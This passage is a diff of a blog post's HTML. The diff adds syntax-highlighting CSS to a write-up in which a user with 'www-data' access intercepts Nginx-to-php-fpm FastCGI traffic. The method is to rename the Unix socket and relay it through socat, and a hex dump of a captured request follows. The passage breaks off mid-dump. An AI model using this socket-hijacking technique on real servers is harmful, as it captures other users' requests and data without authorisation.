@@ -9,10 +9,14 @@
 			margin: 0 auto;
 			color: white;
 			background: black;
+			line-height: calc(1ex / 0.32);
 		}
 		pre {
 			font-family: 'gohu', monospace;
 			white-space: pre-wrap;
+			line-height: 125%;
+      background-color: #111;
+      padding: 1em;
 		}
 		@media only screen and (max-width:768px) {
 			body {
@@ -25,6 +29,48 @@
 		a:visited {
 			color: #004100 ;
 		}
+		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+		.codehilite .hll { background-color: #0000ff }
+		.codehilite { background: #000000; }
+		.codehilite .c { color: #00ff00 } /* Comment */
+		.codehilite .k { color: #ff0000 } /* Keyword */
+		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
+		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
+		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
+		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
+		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
+		.codehilite .cs { color: #00ff00 } /* Comment.Special */
+		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
+		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
+		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
+		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
+		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
+		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
+		.codehilite .s { color: #87ceeb } /* Literal.String */
+		.codehilite .no { color: #7fffd4 } /* Name.Constant */
+		.codehilite .nf { color: #ffff00 } /* Name.Function */
+		.codehilite .nv { color: #eedd82 } /* Name.Variable */
+		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
+		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
+		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
+		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
+		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
+		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
+		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
+		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
+		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
+		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
+		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
+		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
+		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
+		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
+		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
+		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
+		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
+		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
 	
 </style>
 <head>
@@ -41,9 +87,10 @@ I had access to the <code>www-data</code> user, and the server was running <code
 <h2>Dumping the memory</h2>
 <p>The first idea that came to mind was to just dump the memory of the <code>Nginx/php-fpm</code> workers via the <code>/proc/PID/mem</code> and hope that the requests are there. Here is a nice thread about it <a href="https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux">unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux</a> got most of the info there.</p>
 <p>The problem that I ran into was that most tools/scripts uses the <code>ptrace</code> syscall to attach  to the process before dumping it, and you can't <code>ptrace</code> at all on Docker on kernels older than 4.8 without a specific config <code>--cap-add=SYS_PTRACE</code> or on <code>docker-compose.yml</code> :</p>
-<pre><code>cap_add:
+<div class="codehilite"><pre><span></span><code>cap_add:
     - SYS_PTRACE
-</code></pre>
+</code></pre></div>
+
 
 <p>A deeper analysis of this on <a href="https://jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/">jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/</a>.</p>
 <p>On Docker running kernels after 4.8 you can use the <code>process_vm_readv</code> syscall to dump the memory without attaching to it, but you still can't dump the memory of any process under your user. If the <code>/proc/sys/kernel/yama/ptrace_scope</code> is set to <code>1</code> it will only allow <code>ptrace</code>/<code>process_vm_readv</code> if your proccess is the father of the process you want to <code>ptrace</code>, if it's set to zero you can dump the memory, but it's <code>1</code> by default on most systems. More info on <code>Yama</code> on general : <a href="https://www.kernel.org/doc/Documentation/security/Yama.txt">kernel.org/doc/Documentation/security/Yama.txt</a></p>
@@ -56,100 +103,102 @@ I had access to the <code>www-data</code> user, and the server was running <code
 <h2>Unix domain socket</h2>
 <p>Reading through the config file of <code>php-fpm</code> I found out that it used a <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix domain socket</a> to communicate with Nginx using <a href="https://en.wikipedia.org/wiki/FastCGI">Fastcgi</a> , what a horrible name btw.</p>
 <p><code>/usr/local/etc/php-fpm.d/www.conf</code></p>
-<pre><code>[...]
-; The address on which to accept FastCGI requests.
-; Valid syntaxes are:
-;   'ip.add.re.ss:port'    - to listen on a TCP socket to a specific IPv4 address on
-;                            a specific port;
-;   '[ip:6:addr:ess]:port' - to listen on a TCP socket to a specific IPv6 address on
-;                            a specific port;
-;   'port'                 - to listen on a TCP socket to all addresses
-;                            (IPv6 and IPv4-mapped) on a specific port;
-;   '/path/to/unix/socket' - to listen on a unix socket.
-; Note: This value is mandatory.
-listen = /tmp/.php-fpm.sock
-[...]
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="k">[...]</span>
+<span class="c1">; The address on which to accept FastCGI requests.</span>
+<span class="c1">; Valid syntaxes are:</span>
+<span class="c1">;   &#39;ip.add.re.ss:port&#39;    - to listen on a TCP socket to a specific IPv4 address on</span>
+<span class="c1">;                            a specific port;</span>
+<span class="c1">;   &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on</span>
+<span class="c1">;                            a specific port;</span>
+<span class="c1">;   &#39;port&#39;                 - to listen on a TCP socket to all addresses</span>
+<span class="c1">;                            (IPv6 and IPv4-mapped) on a specific port;</span>
+<span class="c1">;   &#39;/path/to/unix/socket&#39; - to listen on a unix socket.</span>
+<span class="c1">; Note: This value is mandatory.</span>
+<span class="na">listen</span> <span class="o">=</span> <span class="s">/tmp/.php-fpm.sock</span>
+<span class="k">[...]</span>
+</code></pre></div>
+
 
 <p>So I began to search for ways of sniffing the Unix domain socket, and turns out it's pretty hard to properly sniff it, mainly because it isn't bound to any protocol, and most reliable ways use <code>ptrace</code>, but a dirty hack it's to just rename the socket, everything's a file on unix yadayada, and create a new one that MiTM it , like this <a href="https://superuser.com/a/576404">superuser.com/a/576404</a>, using <code>socat</code>. Note that this only works if you can write on the socket's directory, I'm still not sure if this is the default when using a supervisor, or it's a misconfig putting the socket on <code>/tmp</code>, but surely it isn't that uncommon.
 So here's the first attempt using <code>socat</code> :</p>
-<pre><code>/tmp $ id
-uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
-/tmp $ mv .php-fpm.sock .php-fpm.sock.1
-/tmp $ ./socat -t100 -x -v UNIX-LISTEN:/tmp/.php-fpm.sock,mode=777,reuseaddr,fork UNIX-
-CONNECT:/tmp/.php-fpm.sock.1
-&gt; 2021/03/25 08:47:56.069495  length=816 from=0 to=815
- 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00  ................
- 01 04 00 01 03 06 02 00 0f 15 53 43 52 49 50 54  ..........SCRIPT
- 5f 46 49 4c 45 4e 41 4d 45 2f 61 70 69 2f 70 75  _FILENAME/api/pu
- 62 6c 69 63 2f 69 6e 64 65 78 2e 70 68 70 0c 07  blic/index.php..
- 51 55 45 52 59 5f 53 54 52 49 4e 47 71 3d 2f 68  QUERY_STRINGq=/h
- 65 79 26 0e 03 52 45 51 55 45 53 54 5f 4d 45 54  ey&amp;..REQUEST_MET
- 48 4f 44 47 45 54 0c 00 43 4f 4e 54 45 4e 54 5f  HODGET..CONTENT_
- 54 59 50 45 0e 00 43 4f 4e 54 45 4e 54 5f 4c 45  TYPE..CONTENT_LE
- 4e 47 54 48 0b 0a                                NGTH..
- 53 43 52 49 50 54 5f 4e 41 4d 45 2f 69 6e 64 65  SCRIPT_NAME/inde
- 78 2e 70 68 70 0b 04 52 45 51 55 45 53 54 5f 55  x.php..REQUEST_U
- 52 49 2f 68 65 79 0c 0a                          RI/hey..
- 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 69 6e 64  DOCUMENT_URI/ind
- 65 78 2e 70 68 70 0d 0b 44 4f 43 55 4d 45 4e 54  ex.php..DOCUMENT
- 5f 52 4f 4f 54 2f 61 70 69 2f 70 75 62 6c 69 63  _ROOT/api/public
- 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f  ..SERVER_PROTOCO
- 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45  LHTTP/1.1..REQUE
- 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47  ST_SCHEMEhttp..G
- 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45  ATEWAY_INTERFACE
- 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f  CGI/1.1..SERVER_
- 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e  SOFTWAREnginx/1.
- 31 38 2e 30 0b 0a                                18.0..
- 52 45 4d 4f 54 45 5f 41 44 44 52 31 37 32 2e 31  REMOTE_ADDR172.1
- 38 2e 30 2e 31 0b 05 52 45 4d 4f 54 45 5f 50 4f  8.0.1..REMOTE_PO
- 52 54 35 37 35 38 30 0b 0a                       RT57580..
- 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e 31  SERVER_ADDR172.1
- 38 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 4f  8.0.2..SERVER_PO
- 52 54 38 30 0b 01 53 45 52 56 45 52 5f 4e 41 4d  RT80..SERVER_NAM
- 45 5f 0f 03 52 45 44 49 52 45 43 54 5f 53 54 41  E_..REDIRECT_STA
- 54 55 53 32 30 30 09 0e 48 54 54 50 5f 48 4f 53  TUS200..HTTP_HOS
- 54 31 32 37 2e 30 2e 30 2e 31 3a 39 30 32 32 0f  T127.0.0.1:9022.
- 52 48 54 54 50 5f 55 53 45 52 5f 41 47 45 4e 54  RHTTP_USER_AGENT
- 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 4d 61 63  Mozilla/5.0 (Mac
- 69 6e 74 6f 73 68 3b 20 49 6e 74 65 6c 20 4d 61  intosh; Intel Ma
- 63 20 4f 53 20 58 20 31 30 2e 31 34 3b 20 72 76  c OS X 10.14; rv
- 3a 38 35 2e 30 29 20 47 65 63 6b 6f 2f 32 30 31  :85.0) Gecko/201
- 30 30 31 30 31 20 46 69 72 65 66 6f 78 2f 38 35  00101 Firefox/85
- 2e 30 0b 4a 48 54 54 50 5f 41 43 43 45 50 54 74  .0.JHTTP_ACCEPTt
- 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61  ext/html,applica
- 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61  tion/xhtml+xml,a
- 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71  pplication/xml;q
- 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70 2c  =0.9,image/webp,
- 2a 2f 2a 3b 71 3d 30 2e 38 14 23 48 54 54 50 5f  */*;q=0.8.#HTTP_
- 41 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 70  ACCEPT_LANGUAGEp
- 74 2d 42 52 2c 70 74 3b 71 3d 30 2e 38 2c 65 6e  t-BR,pt;q=0.8,en
- 2d 55 53 3b 71 3d 30 2e 35 2c 65 6e 3b 71 3d 30  -US;q=0.5,en;q=0
- 2e 33 14 0d 48 54 54 50 5f 41 43 43 45 50 54 5f  .3..HTTP_ACCEPT_
- 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c 20 64 65  ENCODINGgzip, de
- 66 6c 61 74 65 0f 0a                             flate..
- 48 54 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b  HTTP_CONNECTIONk
- 65 65 70 2d 61 6c 69 76 65 1e 01 48 54 54 50 5f  eep-alive..HTTP_
- 55 50 47 52 41 44 45 5f 49 4e 53 45 43 55 52 45  UPGRADE_INSECURE
- 5f 52 45 51 55 45 53 54 53 31 00 00 01 04 00 01  _REQUESTS1......
- 00 00 00 00 01 05 00 01 00 00 00 00              ............
---
-&lt; 2021/03/25 08:47:56.098735  length=168 from=0 to=167
- 01 07 00 01 00 16 02 00 50 72 69 6d 61 72 79 20  ........Primary
- 73 63 72 69 70 74 20 75 6e 6b 6e 6f 77 6e 00 00  script unknown..
- 01 06 00 01 00 6b 05 00 53 74 61 74 75 73 3a 20  .....k..Status:
- 34 30 34 20 4e 6f 74 20 46 6f 75 6e 64 0d 0a     404 Not Found..
- 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 50 48  X-Powered-By: PH
- 50 2f 37 2e 34 2e 31 35 0d 0a                    P/7.4.15..
- 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 74 65  Content-type: te
- 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65 74  xt/html; charset
- 3d 55 54 46 2d 38 0d 0a                          =UTF-8..
- 0d 0a                                            ..
- 46 69 6c 65 20 6e 6f 74 20 66 6f 75 6e 64 2e 0a  File not found..
- 00 00 00 00 00 01 03 00 01 00 08 00 00 00 00 00  ................
- 00 00 00 00 00                                   .....
---
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="nt">tmp</span> <span class="o">$</span> <span class="nt">id</span>
+<span class="nt">uid</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">gid</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span> <span class="nt">groups</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">),</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span>
+<span class="o">/</span><span class="nt">tmp</span> <span class="o">$</span> <span class="nt">mv</span> <span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span> <span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="p">.</span><span class="nc">1</span>
+<span class="o">/</span><span class="nt">tmp</span> <span class="o">$</span> <span class="o">./</span><span class="nt">socat</span> <span class="nt">-t100</span> <span class="nt">-x</span> <span class="nt">-v</span> <span class="nt">UNIX-LISTEN</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/</span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="o">,</span><span class="nt">mode</span><span class="o">=</span><span class="nt">777</span><span class="o">,</span><span class="nt">reuseaddr</span><span class="o">,</span><span class="nt">fork</span> <span class="nt">UNIX-</span>
+<span class="nt">CONNECT</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/</span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="p">.</span><span class="nc">1</span>
+<span class="o">&gt;</span> <span class="nt">2021</span><span class="o">/</span><span class="nt">03</span><span class="o">/</span><span class="nt">25</span> <span class="nt">08</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">56</span><span class="p">.</span><span class="nc">069495</span>  <span class="nt">length</span><span class="o">=</span><span class="nt">816</span> <span class="nt">from</span><span class="o">=</span><span class="nt">0</span> <span class="nt">to</span><span class="o">=</span><span class="nt">815</span>
+ <span class="nt">01</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">08</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span> <span class="nt">00</span>  <span class="o">................</span>
+ <span class="nt">01</span> <span class="nt">04</span> <span class="nt">00</span> <span class="nt">01</span> <span class="nt">03</span> <span class="nt">06</span> <span class="nt">02</span> <span class="nt">00</span> <span class="nt">0f</span> <span class="nt">15</span> <span class="nt">53</span> <span class="nt">43</span> <span class="nt">52</span> <span class="nt">49</span> <span class="nt">50</span> <span class="nt">54</span>  <span class="o">.........</span><span class="p">.</span><span class="nc">SCRIPT</span>
+ <span class="nt">5f</span> <span class="nt">46</span> <span class="nt">49</span> <span class="nt">4c</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">41</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">2f</span> <span class="nt">61</span> <span class="nt">70</span> <span class="nt">69</span> <span class="nt">2f</span> <span class="nt">70</span> <span class="nt">75</span>  <span class="nt">_FILENAME</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">pu</span>
+ <span class="nt">62</span> <span class="nt">6c</span> <span class="nt">69</span> <span class="nt">63</span> <span class="nt">2f</span> <span class="nt">69</span> <span class="nt">6e</span> <span class="nt">64</span> <span class="nt">65</span> <span class="nt">78</span> <span class="nt">2e</span> <span class="nt">70</span> <span class="nt">68</span> <span class="nt">70</span> <span class="nt">0c</span> <span class="nt">07</span>  <span class="nt">blic</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">..</span>
+ <span class="nt">51</span> <span class="nt">55</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">59</span> <span class="nt">5f</span> <span class="nt">53</span> <span class="nt">54</span> <span class="nt">52</span> <span class="nt">49</span> <span class="nt">4e</span> <span class="nt">47</span> <span class="nt">71</span> <span class="nt">3d</span> <span class="nt">2f</span> <span class="nt">68</span>  <span class="nt">QUERY_STRINGq</span><span class="o">=/</span><span class="nt">h</span>
+ <span class="nt">65</span> <span class="nt">79</span> <span class="nt">26</span> <span class="nt">0e</span> <span class="nt">03</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">51</span> <span class="nt">55</span> <span class="nt">45</span> <span class="nt">53</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">54</span>  <span class="nt">ey</span><span class="o">&amp;.</span><span class="p">.</span><span class="nc">REQUEST_MET</span>
+ <span class="nt">48</span> <span class="nt">4f</span> <span class="nt">44</span> <span class="nt">47</span> <span class="nt">45</span> <span class="nt">54</span> <span class="nt">0c</span> <span class="nt">00</span> <span class="nt">43</span> <span class="nt">4f</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">5f</span>  <span class="nt">HODGET</span><span class="o">.</span><span class="p">.</span><span class="nc">CONTENT_</span>
+ <span class="nt">54</span> <span class="nt">59</span> <span class="nt">50</span> <span class="nt">45</span> <span class="nt">0e</span> <span class="nt">00</span> <span class="nt">43</span> <span class="nt">4f</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">4c</span> <span class="nt">45</span>  <span class="nt">TYPE</span><span class="o">.</span><span class="p">.</span><span class="nc">CONTENT_LE</span>
+ <span class="nt">4e</span> <span class="nt">47</span> <span class="nt">54</span> <span class="nt">48</span> <span class="nt">0b</span> <span class="nt">0a</span>                                <span class="nt">NGTH</span><span class="o">..</span>
+ <span class="nt">53</span> <span class="nt">43</span> <span class="nt">52</span> <span class="nt">49</span> <span class="nt">50</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">4e</span> <span class="nt">41</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">2f</span> <span class="nt">69</span> <span class="nt">6e</span> <span class="nt">64</span> <span class="nt">65</span>  <span class="nt">SCRIPT_NAME</span><span class="o">/</span><span class="nt">inde</span>
+ <span class="nt">78</span> <span class="nt">2e</span> <span class="nt">70</span> <span class="nt">68</span> <span class="nt">70</span> <span class="nt">0b</span> <span class="nt">04</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">51</span> <span class="nt">55</span> <span class="nt">45</span> <span class="nt">53</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">55</span>  <span class="nt">x</span><span class="p">.</span><span class="nc">php</span><span class="o">.</span><span class="p">.</span><span class="nc">REQUEST_U</span>
+ <span class="nt">52</span> <span class="nt">49</span> <span class="nt">2f</span> <span class="nt">68</span> <span class="nt">65</span> <span class="nt">79</span> <span class="nt">0c</span> <span class="nt">0a</span>                          <span class="nt">RI</span><span class="o">/</span><span class="nt">hey</span><span class="o">..</span>
+ <span class="nt">44</span> <span class="nt">4f</span> <span class="nt">43</span> <span class="nt">55</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">55</span> <span class="nt">52</span> <span class="nt">49</span> <span class="nt">2f</span> <span class="nt">69</span> <span class="nt">6e</span> <span class="nt">64</span>  <span class="nt">DOCUMENT_URI</span><span class="o">/</span><span class="nt">ind</span>
+ <span class="nt">65</span> <span class="nt">78</span> <span class="nt">2e</span> <span class="nt">70</span> <span class="nt">68</span> <span class="nt">70</span> <span class="nt">0d</span> <span class="nt">0b</span> <span class="nt">44</span> <span class="nt">4f</span> <span class="nt">43</span> <span class="nt">55</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">4e</span> <span class="nt">54</span>  <span class="nt">ex</span><span class="p">.</span><span class="nc">php</span><span class="o">.</span><span class="p">.</span><span class="nc">DOCUMENT</span>
+ <span class="nt">5f</span> <span class="nt">52</span> <span class="nt">4f</span> <span class="nt">4f</span> <span class="nt">54</span> <span class="nt">2f</span> <span class="nt">61</span> <span class="nt">70</span> <span class="nt">69</span> <span class="nt">2f</span> <span class="nt">70</span> <span class="nt">75</span> <span class="nt">62</span> <span class="nt">6c</span> <span class="nt">69</span> <span class="nt">63</span>  <span class="nt">_ROOT</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">public</span>
+ <span class="nt">0f</span> <span class="nt">08</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">56</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span> <span class="nt">50</span> <span class="nt">52</span> <span class="nt">4f</span> <span class="nt">54</span> <span class="nt">4f</span> <span class="nt">43</span> <span class="nt">4f</span>  <span class="o">.</span><span class="p">.</span><span class="nc">SERVER_PROTOCO</span>
+ <span class="nt">4c</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">2f</span> <span class="nt">31</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">0e</span> <span class="nt">04</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">51</span> <span class="nt">55</span> <span class="nt">45</span>  <span class="nt">LHTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">REQUE</span>
+ <span class="nt">53</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">53</span> <span class="nt">43</span> <span class="nt">48</span> <span class="nt">45</span> <span class="nt">4d</span> <span class="nt">45</span> <span class="nt">68</span> <span class="nt">74</span> <span class="nt">74</span> <span class="nt">70</span> <span class="nt">11</span> <span class="nt">07</span> <span class="nt">47</span>  <span class="nt">ST_SCHEMEhttp</span><span class="o">.</span><span class="p">.</span><span class="nc">G</span>
+ <span class="nt">41</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">57</span> <span class="nt">41</span> <span class="nt">59</span> <span class="nt">5f</span> <span class="nt">49</span> <span class="nt">4e</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">46</span> <span class="nt">41</span> <span class="nt">43</span> <span class="nt">45</span>  <span class="nt">ATEWAY_INTERFACE</span>
+ <span class="nt">43</span> <span class="nt">47</span> <span class="nt">49</span> <span class="nt">2f</span> <span class="nt">31</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">0f</span> <span class="nt">0c</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">56</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span>  <span class="nt">CGI</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_</span>
+ <span class="nt">53</span> <span class="nt">4f</span> <span class="nt">46</span> <span class="nt">54</span> <span class="nt">57</span> <span class="nt">41</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">6e</span> <span class="nt">67</span> <span class="nt">69</span> <span class="nt">6e</span> <span class="nt">78</span> <span class="nt">2f</span> <span class="nt">31</span> <span class="nt">2e</span>  <span class="nt">SOFTWAREnginx</span><span class="o">/</span><span class="nt">1</span><span class="o">.</span>
+ <span class="nt">31</span> <span class="nt">38</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">0b</span> <span class="nt">0a</span>                                <span class="nt">18</span><span class="p">.</span><span class="nc">0</span><span class="o">..</span>
+ <span class="nt">52</span> <span class="nt">45</span> <span class="nt">4d</span> <span class="nt">4f</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">5f</span> <span class="nt">41</span> <span class="nt">44</span> <span class="nt">44</span> <span class="nt">52</span> <span class="nt">31</span> <span class="nt">37</span> <span class="nt">32</span> <span class="nt">2e</span> <span class="nt">31</span>  <span class="nt">REMOTE_ADDR172</span><span class="p">.</span><span class="nc">1</span>
+ <span class="nt">38</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">0b</span> <span class="nt">05</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">4d</span> <span class="nt">4f</span> <span class="nt">54</span> <span class="nt">45</span> <span class="nt">5f</span> <span class="nt">50</span> <span class="nt">4f</span>  <span class="nt">8</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">REMOTE_PO</span>
+ <span class="nt">52</span> <span class="nt">54</span> <span class="nt">35</span> <span class="nt">37</span> <span class="nt">35</span> <span class="nt">38</span> <span class="nt">30</span> <span class="nt">0b</span> <span class="nt">0a</span>                       <span class="nt">RT57580</span><span class="o">..</span>
+ <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">56</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span> <span class="nt">41</span> <span class="nt">44</span> <span class="nt">44</span> <span class="nt">52</span> <span class="nt">31</span> <span class="nt">37</span> <span class="nt">32</span> <span class="nt">2e</span> <span class="nt">31</span>  <span class="nt">SERVER_ADDR172</span><span class="p">.</span><span class="nc">1</span>
+ <span class="nt">38</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">32</span> <span class="nt">0b</span> <span class="nt">02</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">56</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span> <span class="nt">50</span> <span class="nt">4f</span>  <span class="nt">8</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">2</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_PO</span>
+ <span class="nt">52</span> <span class="nt">54</span> <span class="nt">38</span> <span class="nt">30</span> <span class="nt">0b</span> <span class="nt">01</span> <span class="nt">53</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">56</span> <span class="nt">45</span> <span class="nt">52</span> <span class="nt">5f</span> <span class="nt">4e</span> <span class="nt">41</span> <span class="nt">4d</span>  <span class="nt">RT80</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_NAM</span>
+ <span class="nt">45</span> <span class="nt">5f</span> <span class="nt">0f</span> <span class="nt">03</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">44</span> <span class="nt">49</span> <span class="nt">52</span> <span class="nt">45</span> <span class="nt">43</span> <span class="nt">54</span> <span class="nt">5f</span> <span class="nt">53</span> <span class="nt">54</span> <span class="nt">41</span>  <span class="nt">E_</span><span class="o">.</span><span class="p">.</span><span class="nc">REDIRECT_STA</span>
+ <span class="nt">54</span> <span class="nt">55</span> <span class="nt">53</span> <span class="nt">32</span> <span class="nt">30</span> <span class="nt">30</span> <span class="nt">09</span> <span class="nt">0e</span> <span class="nt">48</span> <span class="nt">54</span> <span class="nt">54</span> <span class="nt">50</span> <span class="nt">5f</span> <span class="nt">48</span> <span class="nt">4f</span> <span class="nt">53</span>  <span class="nt">TUS200</span><span class="o">.</span><span class="p">.</span><span class="nc">HTTP_HOS</span>
+ <span class="nt">54</span> <span class="nt">31</span> <span class="nt">32</span> <span class="nt">37</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">30</span> <span class="nt">2e</span> <span class="nt">31</span> <span class="nt">3a</span> <span class="nt">39</span> <span class="nt">30</span> <span class="nt">32</span> <span class="nt">32</span> <span class="nt">0f</span>  <span class="nt">T127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">9022</span><span class="o">.</span>
